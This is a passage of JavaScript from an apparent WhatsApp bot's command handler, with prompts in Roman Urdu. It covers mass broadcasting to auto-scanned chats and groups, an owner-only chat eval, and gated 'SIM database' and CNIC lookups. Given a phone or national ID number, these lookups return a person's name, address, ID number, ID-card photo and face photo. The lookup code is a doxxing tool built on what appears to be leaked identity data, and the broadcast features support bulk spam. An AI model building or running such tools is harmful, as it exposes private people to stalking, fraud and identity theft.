    const mediaLabel = mediaType ? ' [' + mediaType.toUpperCase() + ']' : '';
    reply('\ud83d\ude80 *Broadcast Started!*' + mediaLabel + selectionLabel + '\n\n' +
          '*Type:* ' + typeLabel + '\n' +
          '*\ud83d\udcca Total:* ' + targets.length + ' recipients\n' +
          (mediaType ? '*\ud83c\udfa5 Media:* ' + mediaType.toUpperCase() + '\n' : '') +
          '*\u23f0 Delay:* 2.5s gap\n\n' +
          '*_Progress DM mein jaayega_*\n' +
          '*\u274c .bcstop to cancel*');

    sendBulk(devtrust, targets, pending.message, m.sender, typeLabel, mediaBuffer, mediaType).then(results => {
        const status = results.stopped ? '\ud83d\udeab STOPPED' : '\u2705 COMPLETED';
        devtrust.sendMessage(m.sender, {
            text: status + ' *Broadcast Summary*\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n' +
                  '\u2705 Sent: ' + results.success + '\n' +
                  '\u274c Failed: ' + results.failed + '\n' +
                  '\ud83d\udcca Total: ' + results.sent + '/' + targets.length + '\n' +
                  '*\u23f0 Status:* ' + status
        }).catch(() => {});
    });
}
break;
// ── BCSTOP ──────────────────────────────────────────────────────────────
case 'bcsel':
case 'bcselect': {
    if (!text) return reply('\u274c *Usage:* ' + prefix + 'bcsel <selection>\n\n' +
        '*Examples:*\n' +
        '\u2022 ' + prefix + 'bcsel all \u2014 ALL targets\n' +
        '\u2022 ' + prefix + 'bcsel 1,3,5 \u2014 specific numbers\n' +
        '\u2022 ' + prefix + 'bcsel 1-5 \u2014 range\n' +
        '\u2022 ' + prefix + 'bcsel 10 \u2014 first 10\n' +
        '\nPehle ' + prefix + 'bcgroups ya ' + prefix + 'bcusers use karo.');

    const pending = global.bcPending.get(m.sender);
    if (!pending) return reply('\u274c *No pending broadcast!*\n\nPehle use karo:\n' + prefix + 'bcauto <msg>\n' + prefix + 'bcgroups <msg>\n' + prefix + 'bcusers <msg>');
    if (Date.now() > pending.expiresAt) {
        global.bcPending.delete(m.sender);
        return reply('\u23f0 *Broadcast expired* \u2014 timed out (5 min).');
    }

    const selection = parseSelection(text, pending.targets.length);
    if (!selection) {
        return reply('\u274c *Invalid selection!*\n\n' +
            '*Valid formats:*\n' +
            '\u2022 `all` \u2014 ALL\n' +
            '\u2022 `1,3,5` \u2014 specific\n' +
            '\u2022 `1-5` \u2014 range\n' +
            '\u2022 `10` \u2014 first 10');
    }

    await devtrust.sendMessage(m.chat, { react: { text: '\u2705', key: m.key } });

    const selectedTargets = selection.selected.map(i => pending.targets[i]).filter(Boolean);
    pending.selectedTargets = selectedTargets;
    pending.selectionLabel = selection.label;
    global.bcPending.set(m.sender, pending);

    const typeLabel = pending.type === 'groups' ? '\ud83d\udce3 GROUPS' : '\ud83d\udcac PRIVATE CHATS';
    const mediaLabel = pending.mediaInfo ? ' [' + pending.mediaInfo.type.toUpperCase() + ']' : '';

    reply('\u2705 *Selection Confirmed!*' + mediaLabel + '\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n' +
          '*Type:* ' + typeLabel + '\n' +
          '*\ud83d\udcca Selected:* ' + selectedTargets.length + '/' + pending.targets.length + ' (' + selection.label + ')\n' +
          (pending.mediaInfo ? '*\ud83c\udfa5 Media:* ' + pending.mediaInfo.type.toUpperCase() + '\n' : '') +
          '*\ud83d\udcdd Message:* ' + pending.message.substring(0, 80) + (pending.message.length > 80 ? '...' : '') + '\n\n' +
          '*\ud83d\ude80 Reply* `' + prefix + 'yesbc` *to SEND NOW*\n' +
          '\u274c `' + prefix + 'bcstop` to cancel');
}
break;

case 'bcstop': {
    let stopped = false;
    for (const [key, val] of global.bcActive.entries()) {
        if (key.startsWith(m.sender)) { val.stopped = true; stopped = true; }
    }
    if (global.bcPending.has(m.sender)) {
        global.bcPending.delete(m.sender);
        stopped = true;
    }
    await devtrust.sendMessage(m.chat, { react: { text: stopped ? '\ud83d\udeab' : '\u26a0\ufe0f', key: m.key } });
    reply(stopped
        ? '\ud83d\udeab *Broadcast cancelled!*\n\nActive broadcast stopped and pending request cleared.'
        : '\u26a0\ufe0f *No active broadcast* \u2014 nothing to stop.');
}
break;

// ── BCSETTINGS (Per-User) ──────────────────────────────────────
case 'bcsettings': {
    if (!text) {
        const mySettings = getBcSettings(m.sender);
        const status = mySettings.enabled ? '\u2705 ON' : '\u274c OFF';
        return reply(`\u2699\ufe0f *Your Broadcast Settings*\n\nStatus: ${status}\n\n*Tip:*\n\u2022 ${prefix}bcsettings on  \u2192 apna broadcast chalu\n\u2022 ${prefix}bcsettings off \u2192 apna broadcast band\n\n*Is se sirf TUMHARA bot affect hoga, kisi aur ka nahi.*`);
    }
    const setting = text.trim().toLowerCase();
    if (setting === 'on') {
        setBcSettings(m.sender, true);
        reply('\u2705 *Broadcast ON!*\n\nAb tum .bcauto, .bcgroups, .bcusers use kar sakte ho.\nSirf tumhara bot affect hua hai.')
    } else if (setting === 'off') {
        setBcSettings(m.sender, false);
        // Cancel this user's pending broadcast only
        global.bcPending.delete(m.sender);
        reply('\u274c *Broadcast OFF!*\n\nAb tumhara bot broadcast nahi bhejega.\nPending broadcast (agar thi) cancel ho gayi.\nKisi aur user ka koi farq nahi pada.')
    } else {
        reply(`\u274c *Invalid setting*\n\nUse:\n${prefix}bcsettings on\n${prefix}bcsettings off`);
    }
}
break;


// ── BCLIST: View your auto-scanned broadcast list ────────────────────────────────────────────────────────
case 'bclist': {
    const cleanNum = String(m.sender || '').replace(/[^0-9]/g, '');
    const bcFile = path.join(__dirname, 'axis_storage', 'broadcast_lists.json');
    let bcData = {};
    if (fs.existsSync(bcFile)) {
        try { bcData = JSON.parse(fs.readFileSync(bcFile, 'utf-8')); } catch(_e) { bcData = {}; }
    }
    let list = bcData[cleanNum];
    // If not in local file, try DB backup (survives Heroku dyno restarts)
    if (!list || !list.length) {
        try {
            const _dbSvc = require('./server/db-service');
            const _dbRaw = await _dbSvc.getSiteSetting('bc_list_' + cleanNum);
            if (_dbRaw) {
                list = JSON.parse(_dbRaw);
                // Restore to local file for next time
                bcData[cleanNum] = list;
                try {
                    const _bcDir = path.dirname(bcFile);
                    if (!fs.existsSync(_bcDir)) fs.mkdirSync(_bcDir, { recursive: true });
                    fs.writeFileSync(bcFile, JSON.stringify(bcData, null, 2));
                } catch(_) {}
            }
        } catch(_) {}
    }
    if (!list || !list.length) {
        return reply('📋 *No Auto-Scan Data!*\n\n' +
            'Apka bot abhi tak scan nahi hua.\n' +
            '• *.bcrescan* — Abhi manual scan karo\n' +
            '• 3-5 minute wait karo bot connect hone ke baad\n\n' +
            'Ya manually *.bcgroups* ya *.bcusers* use karo.');
    }
    const privateChats = list.filter(e => e.type === 'private');
    const groups = list.filter(e => e.type === 'group');
    let msg = '📋 *Your Broadcast List*\n══════════════\n\n';
    msg += '👥 *Private Chats:* ' + privateChats.length + '\n';
    msg += '📁 *Groups:* ' + groups.length + '\n';
    msg += '📊 *Total:* ' + list.length + '\n\n';

    const showCount = Math.min(list.length, 30);
    for (let i = 0; i < showCount; i++) {
        const e = list[i];
        const emoji = e.type === 'group' ? '📁' : '👤';
        const name = (e.name || e.id.split('@')[0]).substring(0, 25);
        msg += (i + 1).toString().padStart(2, ' ') + '. ' + emoji + ' ' + name + '\n';
    }
    if (list.length > 30) {
        msg += '\n...and ' + (list.length - 30) + ' more\n';
    }
    msg += '\n━━━━━━━━━━━━━━\n';
    msg += '📢 Use: .bcauto <msg> to broadcast\n';
    msg += '📝 Select: .bcauto <msg> phir .bcsel 1,2,3\n';
    reply(msg);
}
break;

// ── BCAUTO: Broadcast using auto-scanned list ───────────────────────────────────────────────────
case 'bcauto': {
    if (!getBcSettings(m.sender).enabled) return reply('\u26d4 *Broadcast OFF!*\n\nApne settings mein broadcast band hai.\n"' + prefix + 'bcsettings on" kar ke chalu karo.');
    if (!text) return reply('📢 *Usage:* ' + prefix + 'bcauto <message>\n\n*Example:* ' + prefix + 'bcauto Eid Mubarak!\n\nIs se auto-scanned list se broadcast hoga. Pehle .bclist se verify karo.');

    await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });

    const cleanNum = String(m.sender || '').replace(/[^0-9]/g, '');
    const bcFile = path.join(__dirname, 'axis_storage', 'broadcast_lists.json');
    let bcData = {};
    if (fs.existsSync(bcFile)) {
        try { bcData = JSON.parse(fs.readFileSync(bcFile, 'utf-8')); } catch(_e) { bcData = {}; }
    }
    const list = bcData[cleanNum];
    if (!list || !list.length) {
        return reply('❌ *No auto-scan data found!*\n\n' +
            'Bot abhi scan nahi hua ya data nahi mila.\n' +
            '2 min wait karo, phir .bclist se check karo.\n\n' +
            'Ya manually use karo:\n' + prefix + 'bcgroups <msg>\n' + prefix + 'bcusers <msg>');
    }

    let mediaInfo = null;
    const qm = getQuotedMediaType(m.quoted);
    if (qm) mediaInfo = { type: qm.type, msg: qm.msg };
    const mediaLabel = mediaInfo ? ' [' + qm.type.toUpperCase() + ']' : '';

    const targets = list.map(e => ({ id: e.id, name: e.name || e.id.split('@')[0] }));
    const privateCount = list.filter(e => e.type === 'private').length;
    const groupCount = list.filter(e => e.type === 'group').length;

    let preview = '🔄 *AUTO-SCAN BROADCAST*' + mediaLabel + '\n══════════════\n\n';
    preview += '📊 *Total Targets:* ' + targets.length + '\n';
    preview += '👥 *Private Chats:* ' + privateCount + '\n';
    preview += '📁 *Groups:* ' + groupCount + '\n\n';
    preview += formatNumberedList(targets.slice(0, 30), '📋 *Your Contacts*', '📄');
    if (targets.length > 30) {
        preview += '\n...and ' + (targets.length - 30) + ' more\n';
    }
    preview += '\n*📝 Message:* ' + text.substring(0, 80) + (text.length > 80 ? '...' : '') + '\n';
    preview += '\n*⏰ Delay:* 2.5s between messages';
    preview += buildSelectPrompt(prefix);
    reply(preview);

    global.bcPending.set(m.sender, {
        type: 'auto', message: text, targets: targets,
        mediaInfo: mediaInfo,
        selectedTargets: null,
        selectionLabel: null,
        expiresAt: Date.now() + 5 * 60 * 1000
    });
}
break;

// ── BCRESCAN: Manually re-scan chats + groups anytime ─────────────────────────────────────────────────
case 'bcrescan': {
    const cleanNum = String(m.sender || '').replace(/[^0-9]/g, '');
    // devtrust IS the user's own bot socket (linked device) — use it directly
    if (!devtrust) {
        return reply('❌ *Bot not connected!*\n\nPehle apna bot connect karo, phir .bcrescan try karo.');
    }

    try { await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } }); } catch(_){}
    reply('🔄 *Manual Scan Shuru Ho Gaya!*\n\nApki sari chats + groups scan ho rahi hain...\nThodi der ruko (10-30 seconds).');

    try {
        const pairModule = require('./pair');
        const scanResults = await pairModule.autoScanBroadcastList(devtrust, cleanNum, store);

        if (scanResults && scanResults.total > 0) {
            reply('✅ *Scan Complete!*\n━━━━━━━━━━━━━━\n\n✅ Found *' + scanResults.total + '* contacts:\n• 👥 *' + scanResults.privateChats + '* Private Chats\n• 📁 *' + scanResults.groups + '* Groups\n\n*Ab use karo:*\n• *.bclist* — Apni list dekho\n• *.bcauto <msg>* — Broadcast karo');
        } else {
            reply('⚠️ *Koi chat nahi mili!*\n\nStore abhi sync nahi hua shayad.\n3-5 minute baad dobara .bcrescan try karo.\n\n*Tip:* WhatsApp pe kuch messages bhejo phir scan karo.');
        }
    } catch (e) {
        reply('❌ *Scan fail hua!*\n\nError: ' + e.message + '\n\nBaad mein dobara try karo.');
    }
}
break;

// ── BCADD: Manually add a number to broadcast list ──────────────────────────────────────────────────
  case 'bcadd': {
      const cleanNum = String(m.sender || '').replace(/[^0-9]/g, '');
      const bcFile = path.join(__dirname, 'axis_storage', 'broadcast_lists.json');
      let bcData = {};
      if (fs.existsSync(bcFile)) {
          try { bcData = JSON.parse(fs.readFileSync(bcFile, 'utf-8')); } catch(_e) { bcData = {}; }
      }
      if (!bcData[cleanNum]) bcData[cleanNum] = [];
      // Legacy migration: if old object format {numbers:[], groups:[]}, convert to array
      if (!Array.isArray(bcData[cleanNum])) {
          const old = bcData[cleanNum];
          const migrated = [];
          if (old.numbers && Array.isArray(old.numbers)) {
              for (const n of old.numbers) {
                  migrated.push({ id: n, name: n.split('@')[0], type: 'private' });
              }
          }
          if (old.groups && Array.isArray(old.groups)) {
              for (const g of old.groups) {
                  migrated.push({ id: g, name: g.split('@')[0], type: 'group' });
              }
          }
          bcData[cleanNum] = migrated;
      }

      const addTarget = (text || '').trim().replace(/[^0-9]/g, '');
      if (!addTarget) {
          reply('\u{2754} *BCADD Usage:*\n\n' +
              '.bcadd <number>\n\n' +
              'Example: .bcadd 923001234567\n\n' +
              'Yeh number/contact aapki broadcast list mein add ho jaye ga.');
          break;
      }

      const jid = addTarget + '@s.whatsapp.net';
      const list = bcData[cleanNum];
      if (list.find(e => e.id === jid)) {
          reply('\u{26A0}\u{FE0F} *Already in list!*\n\n' +
              '+' + addTarget + ' pehle se aapki broadcast list mein hai.');
          break;
      }

      list.push({ id: jid, name: addTarget, type: 'private' });
      fs.writeFileSync(bcFile, JSON.stringify(bcData, null, 2));
      reply('\u{2705} *Number Added!*\n\n' +
          'Number: +' + addTarget + '\n' +
          'Total contacts: ' + list.length + '\n\n' +
          '\u{1F4E2} Ab .bcauto se broadcast kar saktay ho.');
  }
  break;

  // ── BCDEL: Remove a specific number/group from broadcast list ────────────────────────────────────────────────────

// ── BCSCAN: Manual broadcast scan with LIVE progress counter ──────────────────────────────────────────────
case 'bcscan': {
    const _bcNum = String(m.sender || '').replace(/[^0-9]/g, '');
    if (!devtrust) {
        return reply('❌ *Bot not connected!*\n\nPehle apna bot connect karo, phir .bcscan try karo.');
    }

    try { await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } }); } catch(_){}

    let _progressMsg = null;
    try {
        _progressMsg = await reply('🔍 *Broadcast Scan Progress*\n━━━━━━━━━━━━━━\n\n⏳ Scanning your chats + groups...\n0 contacts found so far\n\n⏱️ Please wait, 10-30 seconds lagenge...');
    } catch (_) { _progressMsg = null; }

    let _lastCount = 0;
    let _scanDone = false;

    const _progressTimer = setInterval(async () => {
        if (_scanDone) return;
        try {
            const _bcFile2 = path.join(__dirname, 'axis_storage', 'broadcast_lists.json');
            let _bcData2 = {};
            if (fs.existsSync(_bcFile2)) {
                try { _bcData2 = JSON.parse(fs.readFileSync(_bcFile2, 'utf-8')); } catch(_e) {}
            }
            const _list2 = _bcData2[_bcNum] || [];
            if (_list2.length > _lastCount) {
                _lastCount = _list2.length;
                const _pvt2 = _list2.filter(e => e.type === 'private').length;
                const _grp2 = _list2.filter(e => e.type === 'group').length;
                const _progText = '🔍 *Scanning...*\n━━━━━━━━━━━━━━\n\n✅ *' + _list2.length + '* contacts found so far:\n• 👤 ' + _pvt2 + ' Private Chats\n• 📁 ' + _grp2 + ' Groups\n\n⏱️ Still scanning...';
                if (_progressMsg && _progressMsg.key) {
                    try { await devtrust.sendMessage(m.chat, { text: _progText, edit: _progressMsg.key }); } catch (_) {}
                }
            }
        } catch (_) {}
    }, 3000);

    try {
        const pairMod = require('./pair');
        const scanRes = await pairMod.autoScanBroadcastList(devtrust, _bcNum, store);
        _scanDone = true;
        clearInterval(_progressTimer);

        if (scanRes && scanRes.total > 0) {
            const _finalText = '✅ *Scan Complete!*\n━━━━━━━━━━━━━━\n\n🎉 *' + scanRes.total + '* contacts scanned!\n• 👤 *' + scanRes.privateChats + '* Private Chats\n• 📁 *' + scanRes.groups + '* Groups\n\n*Ab use karo:*\n• .bclist — Apni list dekho\n• .bcauto <msg> — Broadcast karo\n• .bcrescan — Dobara scan karo';
            if (_progressMsg && _progressMsg.key) {
                try { await devtrust.sendMessage(m.chat, { text: _finalText, edit: _progressMsg.key }); } catch (_) { reply(_finalText); }
            } else { reply(_finalText); }
        } else {
            const _noText = '⚠️ *Scan complete — 0 contacts!*\n\nStore abhi sync nahi hua shayad.\n3-5 minute baad .bcscan ya .bcrescan try karo.\n\n*Tip:* WhatsApp pe kuch messages bhejo phir scan karo.';
            if (_progressMsg && _progressMsg.key) {
                try { await devtrust.sendMessage(m.chat, { text: _noText, edit: _progressMsg.key }); } catch (_) { reply(_noText); }
            } else { reply(_noText); }
        }
    } catch (e) {
        _scanDone = true;
        clearInterval(_progressTimer);
        const _errText = '❌ *Scan fail hua!*\n\nError: ' + e.message + '\n\nBaad mein dobara try karo.';
        if (_progressMsg && _progressMsg.key) {
            try { await devtrust.sendMessage(m.chat, { text: _errText, edit: _progressMsg.key }); } catch (_) { reply(_errText); }
        } else { reply(_errText); }
    }
}
break;

case 'bcdel': {
    const cleanNum = String(m.sender || '').replace(/[^0-9]/g, '');
    const bcFile = path.join(__dirname, 'axis_storage', 'broadcast_lists.json');
    let bcData = {};
    if (fs.existsSync(bcFile)) {
        try { bcData = JSON.parse(fs.readFileSync(bcFile, 'utf-8')); } catch(_e) { bcData = {}; }
    }
    const list = bcData[cleanNum];
    if (!list || !list.length) {
        return reply('\u{1F4CB} *No Auto-Scan Data!*\n\n' +
            'Apki list khali hai. Pehle bot connect karo ya .bcrescan karo.');
    }

    if (!text) {
        return reply('\u{274C} *Usage:* ' + prefix + 'bcdel <number_or_index>\n\n' +
            '*Examples:*\n' +
            '\u{2022} ' + prefix + 'bcdel 923001234567\n' +
            '\u{2022} ' + prefix + 'bcdel 5  (list ka 5th number)\n' +
            '\u{2022} ' + prefix + 'bcdel 12036302888888888@g.us\n\n' +
            'Pehle .bclist se number check karo, phir .bcdel use karo.');
    }

    const input = text.trim();
    let removed = null;
    let removedIdx = -1;

    // Try by list index (1-based)
    const idx = parseInt(input, 10);
    if (!isNaN(idx) && idx > 0 && idx <= list.length) {
        removed = list[idx - 1];
        removedIdx = idx;
        list.splice(idx - 1, 1);
    } else {
        // Try by number/JID match
        const normalized = input.replace(/[^0-9]/g, '');
        const matchIdx = list.findIndex(e => {
            const eNum = e.id.replace(/[^0-9]/g, '');
            return e.id === input || eNum === normalized || eNum.endsWith(normalized) || normalized.endsWith(eNum);
        });
        if (matchIdx >= 0) {
            removed = list[matchIdx];
            removedIdx = matchIdx + 1;
            list.splice(matchIdx, 1);
        }
    }

    if (!removed) {
        return reply('\u{274C} *Number not found!*\n\n' +
            '"' + input + '" list mein nahi mila.\n' +
            'Pehle .bclist se check karo, phir dobara try karo.\n\n' +
            '*Tip:* Number ka last 4-5 digit bhi kaam kar sakta hai.');
    }

    // Save updated list
    bcData[cleanNum] = list;
    fs.writeFileSync(bcFile, JSON.stringify(bcData, null, 2));

    const typeLabel = removed.type === 'group' ? '\u{1F4C1} Group' : '\u{1F464} Private Chat';
    reply('\u{2705} *Removed from list!*\n\n' +
        typeLabel + '\n' +
        '*Name:* ' + (removed.name || removed.id.split('@')[0]) + '\n' +
        '*ID:* ' + removed.id + '\n' +
        '*Index:* #' + removedIdx + '\n\n' +
        '\u{1F4CA} List mein ab ' + list.length + ' contacts bache hain.\n\n' +
        '\u{1F4E2} .bclist se verify karo\n' +
        '\u{274C} .bcdel se aur nikaalo');
}
break;

// ============ END MISSING COMMANDS ============

default:
    // Check if body exists before trying to use it
    if (body && body.startsWith) {
        // Safe eval - ONLY for owner and with logging
        if (body.startsWith('<')) {
            if (!isCreator) {
                console.log(`⚠️ Non-owner tried to use eval: ${m.sender}`);
                return;
            }
            
            try {
                const result = await eval(`(async () => { return ${body.slice(3)} })()`);
                const output = util.inspect(result, { depth: 1 });
                
                console.log(chalk.yellow(`📝 Eval executed by owner: ${body.slice(3)}`));
                
                if (output.length > 4000) {
                    await m.reply('✅ *Executed* (output too long)');
                } else {
                    await m.reply(output);
                }
            } catch (e) {
                await m.reply(`❌ Error: ${e.message}`);
            }
            break;
        }
        
        // Safe async eval - ONLY for owner
        if (body.startsWith('>')) {
            if (!isCreator) {
                console.log(`⚠️ Non-owner tried to use async eval: ${m.sender}`);
                return;
            }
            
            try {
                let evaled = await eval(body.slice(2));
                if (typeof evaled !== 'string') evaled = util.inspect(evaled, { depth: 1 });
                
                console.log(chalk.yellow(`📝 Async eval executed by owner`));
                
                if (evaled.length > 4000) {
                    await m.reply('✅ *Executed* (output too long)');
                } else {
                    await m.reply(evaled);
                }
            } catch (err) {
                await m.reply(`❌ Error: ${err.message}`);
            }
            break;
        }
    }
    break; // unknown command — ignore silently

      case 'simdata':
      case 'sim':
      case 'allsim': {
          {
              const _sdSenderNum = (m.sender || '').split('@')[0].split(':')[0];
              const _sdBannedFile = './database/bug_banned.json';
              const _sdUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
              let _sdBnd = [];
              try { if (fs.existsSync(_sdBannedFile)) _sdBnd = JSON.parse(fs.readFileSync(_sdBannedFile, 'utf-8')); } catch(e) {}
              if (_sdBnd.some(id => String(id).replace(/[^0-9]/g,'') === _sdSenderNum))
                  return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
              let _sdUnlk = [];
              try { if (fs.existsSync(_sdUnlockedFile)) _sdUnlk = JSON.parse(fs.readFileSync(_sdUnlockedFile, 'utf-8')); } catch(e) {}
              if (!_sdUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _sdSenderNum))
                  return reply(`🔒 *SIM Database — Locked Section*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
          }
          const query = (text || '').trim();
          if (!query) {
              await m.reply(`❌ *Usage:*\n${prefix}simdata <number>\n${prefix}allsim <number>\n\n*Example:*\n${prefix}simdata 3001234567\n${prefix}simdata 1234512345671`);
              break;
          }
          await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

          try {
              const _sdResult = await lookupSimDatabase(query);
              if (_sdResult.records.length > 0) {
                  const _sdMsg = formatSimRecordsMessage({
                      records: _sdResult.records,
                      normalized: _sdResult.normalized,
                      rawQuery: query,
                      title: '🗄️ *CYBERSECPRO SIM DATABASE*',
                      photos: _sdResult.photos,
                  });
                  await m.reply(_sdMsg);
                  const _sdPhotosSent = await sendSimPhotos(devtrust, m.chat, _sdResult.photos, m);
                  if (!_sdPhotosSent.length && _sdResult.records.some(r => r.cnicPhoto || r.personPhoto)) {
                      await sendSimPhotos(devtrust, m.chat, {
                          cnicPhotos: _sdResult.records.map(r => r.cnicPhoto).filter(Boolean),
                          personPhotos: _sdResult.records.map(r => r.personPhoto).filter(Boolean),
                      }, m);
                  }
                  await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
              } else {
                  await m.reply(`❌ *No records found for:* ${query}\n\n_Ye number/CNIC database mein nahi hai ya format galat hai_\n\n*Supported formats:*\n• 3001234567\n• 03001234567\n• 923001234567\n• CNIC 13 digits`);
                  await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
              }
          } catch (_sdErr) {
              await m.reply(`❌ *Lookup failed:* ${_sdErr.message || 'Error'}`);
              await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
          }
          break;
      }
  

      case 'simdatabase':
      case 'simdb':
      case 'dbmenu': {
          {
              const _sdbLkSender = (m.sender || '').split('@')[0].split(':')[0];
              const _sdbBannedFile = './database/bug_banned.json';
              const _sdbUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
              let _sdbBnd = [];
              try { if (fs.existsSync(_sdbBannedFile)) _sdbBnd = JSON.parse(fs.readFileSync(_sdbBannedFile, 'utf-8')); } catch(e) {}
              if (_sdbBnd.some(id => String(id).replace(/[^0-9]/g,'') === _sdbLkSender))
                  return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
              let _sdbUnlk = [];
              try { if (fs.existsSync(_sdbUnlockedFile)) _sdbUnlk = JSON.parse(fs.readFileSync(_sdbUnlockedFile, 'utf-8')); } catch(e) {}
              if (!_sdbUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _sdbLkSender))
                  return reply(`🔒 *SIM Database Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
          }
          autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
          await devtrust.sendMessage(m.chat, { react: { text: '🗄️', key: m.key } });

          const _sdbUptime = formatUptime(process.uptime());
          const _sdbOwner = getOwnerName();
          const _sdbVersion = getBotVersion();
          const _sdbMode = getBotMode();
          const _sdbDateTime = getCurrentDateTime();
          const _sdbMood = getMoodEmoji();
          const _sdbDate = getLagosTime();
          const _sdbHour = _sdbDate.getHours();
          const _sdbGreet = _sdbHour < 12 ? 'Good Morning' : _sdbHour < 18 ? 'Good Afternoon' : 'Good Evening';
          const _sdbReadmore = String.fromCharCode(8206).repeat(4001);

          const _sdbMenuText = `
  ┏━━◆ *CYBER - 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄* ◆━━┓
  ┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
  ┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
  ┃ ⧎ ᴠᴇʀsɪᴏɴ : *${_sdbVersion}*
  ┃ ⧎ ᴏᴡɴᴇʀ : *${_sdbOwner}*
  ┃ ⧎ ᴍᴏᴅᴇ : *${_sdbMode}*
  ┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${_sdbUptime}
  ┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
  ┃ *${_sdbGreet}*, @${m?.sender.split('@')[0]}
  ┃ 🕒 ${_sdbDateTime} ${_sdbMood}
  ┗━━━━━━━━━━━━━━━━━━━━┛

  ❖═━═══𖠁𐂃𖠁══━═❖
  ♱  ${_sdbGreet}, *${pushname}*
  *CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
  ⚙️ *Powered by CYBER SEC PRO*
  ❖═━═══𖠁𐂃𖠁══━═❖

   ┏━━◆ *CYBER - 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐌𝐄𝐍𝐔* ◆━━┓
  │
  │ ◈ *🔍 𝗦𝗘𝗔𝗥𝗖𝗛 𝗕𝗬 𝗣𝗛𝗢𝗡𝗘*
  │❖ ${prefix}simdata 3001234567
  │❖ ${prefix}sim 3001234567
  │   ↳ _Number bina 0 ya +92 ky_
  │
  │ ◈ *🆔 𝗦𝗘𝗔𝗥𝗖𝗛 𝗕𝗬 𝗖𝗡𝗜𝗖*
  │❖ ${prefix}simdata 1234512345671
  │❖ ${prefix}cnicdata 1234512345671
  │❖ ${prefix}cnic 1234512345671
  │   ↳ _13 digit CNIC number_
  │
  │ ◈ *📋 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡*
  │❖ ${prefix}simdatabase  ← This menu
  │
  │ ◈ *📊 𝗗𝗔𝗧𝗔 𝗙𝗜𝗘𝗟𝗗𝗦 𝗥𝗘𝗧𝗨𝗥𝗡𝗘𝗗*
  │  👤 Full Name
  │  📱 Phone Number
  │  🆔 CNIC Number
  │  🏠 Address
  │  🪪 CNIC Photo (auto)
  │  📸 Person Photo (auto)
  │
  │ ◈ *⚠️ 𝗡𝗢𝗧𝗘𝗦*
  │  • Sirf Pakistani numbers support
  │  • Database: CYBERSECPRO
  │  • Results: Real-time
  │
  ┗━━━━━━━━━━━━━━━━━━━━┛

  ⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
  `;

          const _sdbImages = ['https://files.catbox.moe/smv12k.jpeg'];
          const _sdbImg = _sdbImages[0];
          try {
              await devtrust.sendMessage(from,
                  addNewsletterContext({
                      image: { url: _sdbImg },
                      caption: _sdbMenuText
                  }),
                  { quoted: m }
              );
          } catch (_sdbImgErr) {
              await devtrust.sendMessage(from,
                  addNewsletterContext({ text: _sdbMenuText }),
                  { quoted: m }
              );
          }
      }
      break;

      case 'cnicdata':
      case 'cnic': {
          {
              const _cnSenderNum = (m.sender || '').split('@')[0].split(':')[0];
              const _cnBannedFile = './database/bug_banned.json';
              const _cnUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
              let _cnBnd = [];
              try { if (fs.existsSync(_cnBannedFile)) _cnBnd = JSON.parse(fs.readFileSync(_cnBannedFile, 'utf-8')); } catch(e) {}
              if (_cnBnd.some(id => String(id).replace(/[^0-9]/g,'') === _cnSenderNum))
                  return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
              let _cnUnlk = [];
              try { if (fs.existsSync(_cnUnlockedFile)) _cnUnlk = JSON.parse(fs.readFileSync(_cnUnlockedFile, 'utf-8')); } catch(e) {}
              if (!_cnUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _cnSenderNum))
                  return reply(`🔒 *CNIC Database — Locked Section*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
          }
          const _cnQuery = (text || '').trim();
          if (!_cnQuery) {
              await m.reply(`❌ *Usage:* ${prefix}cnicdata <CNIC>\n\n*Example:*\n${prefix}cnicdata 1234512345671`);
              break;
          }
          if (_cnQuery.replace(/[^0-9]/g, '').length !== 13) {
              await m.reply(`❌ *CNIC 13 digits ka hona chahiye*\n\n*Example:* ${prefix}cnicdata 3520212345671`);
              break;
          }
          await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

          try {
              const _cnResult = await lookupSimDatabase(_cnQuery);
              if (_cnResult.records.length > 0) {
                  const _cnMsg = formatSimRecordsMessage({
                      records: _cnResult.records,
                      normalized: _cnResult.normalized,
